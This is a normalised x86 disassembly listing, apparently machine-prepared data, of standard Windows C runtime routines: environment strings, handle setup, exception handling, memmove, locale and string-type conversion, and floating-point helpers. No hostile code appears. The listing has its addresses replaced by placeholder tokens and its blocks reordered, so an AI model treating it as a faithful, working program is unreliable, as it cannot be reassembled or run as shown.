mov ebp eax
push ebp
call sub_429a56
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_429a56
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
add eax ebp
cmp [ eax ] bx
jne r-xdata
push ebp
push esi
push edi
call sub_42e720
add esp 0xc
xor edi edi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_429931
pop ecx
mov [ esp + 0x10 ] ebx
sub_42e2ac
sub esp 0x44
push 0x100
call sub_429a56
test eax eax
pop ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] 0x20
lea ecx [ eax + 0x100 ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax ecx
jb r-xdata
add esp 0x44
retn
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ rw-data ]
add eax 0x8
add ecx 0x100
push ebx
push esi
push edi
lea eax [ esp + 0xc ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x3e ] 0x0
je r-xdata
xor ebx ebx
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
push ebp
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
lea esi [ eax + ebx * 8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
cmp eax 0x2
mov [ esi ] edi
jne r-xdata
pop ebp
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
jmp r-xdata
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
cmp eax ecx
jb r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
mov eax edi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov ecx edi
and ecx 0x1f
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x100
call sub_429a56
test eax eax
pop ecx
je r-xdata
jmp r-xdata
sub_42e457
push 0xc
push r--data
call sub_42a4d8
mov [ ebp - 0x1c ] r--data
call sub_42a513
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_42e49b
push 0xc
push r--data
call sub_42a4d8
mov [ ebp - 0x1c ] r--data
call sub_42a513
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_42e4cc
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x1c ] r--data
jae r-xdata
call sub_42a513
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
sub_42e4f8
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_42986e
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_42982c
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_42986e
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_429902
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_42e5d8
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_42e700
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
call sub_42a47e
pop esi
retn 0x4
sub_42e640
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_42e720
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_42e780 ]
jmp [ ecx * 4 + jump_table_42e800 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e86c ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42e86c ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_42ea08 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_42e90c ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ea08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e86c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e86c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_42e86c ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_42ea08 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ea08 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ea08 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_42ea08 ]
sub_42ea5d
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
and [ ebp - 0x6 ] 0x0
push 0x6
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_43056c
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
call sub_42fac0
leave
retn
sub_42eaa6
push 0x38
push r--data
call sub_42a4d8
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x1c ] eax
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] edi
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov ebx [ ebp - 0x48 ]
lea ecx [ ebp - 0x40 ]
push ecx
push eax
mov esi [ GetCPInfo@IAT ]
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
push ebx
call sub_429931
pop ecx
cmp [ ebp - 0x2c ] edi
je r-xdata
cmp [ ebp - 0x40 ] 0x1
jne r-xdata
mov esi [ ebp - 0x44 ]
cmp ebx 0xffffffff
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x48 ] ebx
lea eax [ esi + esi ]
push eax
push edi
push ebx
call sub_42b940
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push edi
push edi
push ebx
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x44 ] esi
cmp esi edi
je r-xdata
push [ ebp + 0x10 ]
call sub_42daa0
pop ecx
mov esi eax
inc esi
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x40 ] 0x1
jne r-xdata
cmp ebx edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x2c ] edi
jne r-xdata
mov [ ebp - 0x44 ] esi
jmp r-xdata
mov [ ebp - 0x2c ] 0x1
push esi
push ebx
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push esi
push 0x2
call sub_429969
pop ecx
pop ecx
mov ebx eax
cmp ebx edi
jne r-xdata
lea esp [ ebp - 0x54 ]
mov ecx [ ebp - 0x1c ]
xor ecx [ ebp + 0x4 ]
call sub_42fac0
call sub_42a513
retn
cmp [ ebp - 0x24 ] edi
je r-xdata
cmp [ ebp + 0x18 ] edi
je r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push esi
push 0x1
call sub_429969
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
push edi
push edi
push esi
push eax
push esi
push ebx
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
cmp eax edi
jne r-xdata
cmp [ ebp - 0x28 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_429931
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
sub_42ec75
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x4
pop eax
call sub_42a0c0
mov ebx esp
push 0x1c
lea eax [ ebp - 0x24 ]
push eax
push ebx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x20 ]
lea eax [ ebp - 0x48 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x44 ]
lea esi [ eax - 0x1 ]
not esi
and esi ebx
sub esi eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov ecx eax
dec ecx
neg ecx
sbb ecx ecx
and ecx 0xffff1000
add ecx 0x11000
add ecx edi
cmp esi ecx
jb r-xdata
lea esp [ ebp - 0x54 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x1
je r-xdata
mov ebx esi
mov ebx edi
mov edi 0x1000
add ebx [ ebp - 0x18 ]
test [ ebp - 0x14 ] edi
je r-xdata
push 0x1c
lea eax [ ebp - 0x24 ]
push eax
push ebx
call [ VirtualQuery@IAT ]
test eax eax
je r-xdata
test [ ebp - 0xf ] 0x1
mov ebx [ ebp - 0x24 ]
je r-xdata
cmp esi ebx
jae r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x4
push edi
push [ ebp - 0x4 ]
push ebx
call [ VirtualAlloc@IAT ]
mov eax [ rw-data ]
jmp r-xdata
dec eax
neg eax
sbb eax eax
and eax 0x103
lea ecx [ ebp - 0x8 ]
push ecx
inc eax
push eax
push [ ebp - 0x4 ]
push ebx
call [ VirtualProtect@IAT ]
sub_42ed46
push 0x1c
push r--data
call sub_42a4d8
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
xor edi edi
inc edi
push edi
push r--data
push edi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
mov ebx [ ebp + 0x1c ]
cmp ebx esi
jne r-xdata
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
mov ebx [ rw-data ]
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x2
push ebx
call sub_42ea5d
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi [ rw-data ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
cmp eax edi
je r-xdata
lea esp [ ebp - 0x38 ]
call sub_42a513
retn
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
xor eax eax
cmp [ ebp + 0x20 ] esi
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call [ GetStringTypeA@IAT ]
mov edi eax
test esi esi
je r-xdata
push 0x0
push 0x0
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push edi
call sub_42eaa6
add esp 0x18
mov esi eax
test esi esi
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + edi ]
mov eax ebx
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x2c ] esi
push ebx
push 0x0
push esi
call sub_42b940
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_429931
pop ecx
mov [ ebp + 0xc ] esi
test esi esi
jne r-xdata
push edi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push 0x2
call sub_429969
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x20 ]
jmp r-xdata
push esi
call sub_429931
pop ecx
sub_42ef00
mov eax [ esp + 0x8 ]
push 0x20
pop ecx
cdq
idiv ecx
push 0x1f
pop ecx
sub ecx edx
or edx 0xffffffff
shl edx cl
mov ecx [ esp + 0x4 ]
not edx
test [ ecx + eax * 4 ] edx
je r-xdata
inc eax
cmp eax 0x3
jl r-xdata
xor eax eax
retn
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
retn
sub_42ef32
mov eax [ esp + 0x8 ]
push esi
push edi
push 0x20
pop ecx
cdq
idiv ecx
mov edi [ esp + 0xc ]
mov esi eax
lea eax [ edi + esi * 4 ]
push eax
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
push edx
push [ eax ]
call sub_4305c4
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
retn
lea edi [ edi + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_4305c4
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_42ef7f
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
dec edi
push 0x20
lea eax [ edi + 0x1 ]
pop ecx
cdq
idiv ecx
push 0x1f
pop esi
sub esi edx
xor edx edx
inc edx
mov ecx esi
shl edx cl
mov ebx eax
mov eax [ ebp + 0x8 ]
test [ eax + ebx * 4 ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax + ebx * 4 ] edx
inc ebx
cmp ebx ecx
jge r-xdata
lea ecx [ edi + 0x1 ]
push ecx
push eax
call sub_42ef00
test eax eax
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
lea edi [ eax + ebx * 4 ]
sub ecx ebx
xor eax eax
[ edi ]
mov eax [ ebp + 0x8 ]
push edi
push [ ebp + 0x8 ]
call sub_42ef32
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
sub_42eff1
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x3
pop edx
sub ecx eax
push esi
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_42f025
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
pop esi
cdq
mov ecx esi
idiv ecx
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
mov [ ebp + 0xc ] esi
mov ecx edx
shl edi cl
mov [ ebp - 0x8 ] eax
xor eax eax
sub [ ebp + 0xc ] edx
not edi
mov [ ebp - 0x4 ] eax
mov esi [ ebx + eax * 4 ]
mov ecx esi
and ecx edi
mov [ ebp - 0xc ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp + 0xc ]
or esi [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] esi
mov esi [ ebp - 0xc ]
shl esi cl
inc eax
cmp eax 0x3
mov [ ebp - 0x4 ] esi
jl r-xdata
push 0x2
pop eax
mov ecx eax
sub ecx [ ebp - 0x8 ]
lea ecx [ ebx + ecx * 4 ]
and [ ebx + eax * 4 ] 0x0
mov edx [ ecx ]
mov [ ebx + eax * 4 ] edx
jmp r-xdata
cmp eax [ ebp - 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec eax
sub ecx 0x4
test eax eax
jge r-xdata
sub_42f0a0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
shl eax 0x10
and edi 0x7fff
sub edi 0x3fff
cmp edi 0xffffc001
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_42eff1
push [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_42ef7f
add esp 0x10
test eax eax
je r-xdata
xor ebx ebx
call sub_42f00c
test eax eax
pop ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx eax
sub ecx [ esi + 0x8 ]
cmp edi ecx
jge r-xdata
inc edi
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
cmp edi eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp esi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ esi + 0xc ]
mov esi [ esi + 0x10 ]
shl ebx cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
or ebx [ ebp - 0xc ]
cmp esi 0x40
jne r-xdata
cmp edi [ esi ]
push [ esi + 0xc ]
jl r-xdata
sub eax edi
mov edi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_42eff1
lea eax [ ebp - 0xc ]
push edi
push eax
call sub_42f025
push [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_42ef7f
mov eax [ esi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_42f025
add esp 0x20
xor ebx ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
mov ebx [ esi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add ebx edi
call sub_42f025
pop ecx
pop ecx
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_42f025
mov ebx [ esi + 0x14 ]
add ebx [ esi ]
pop ecx
xor eax eax
pop ecx
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_42f224
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_430782
push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_42f1f8
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
add esp 0x24
call sub_42fac0
leave
retn
sub_42f267
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_430782
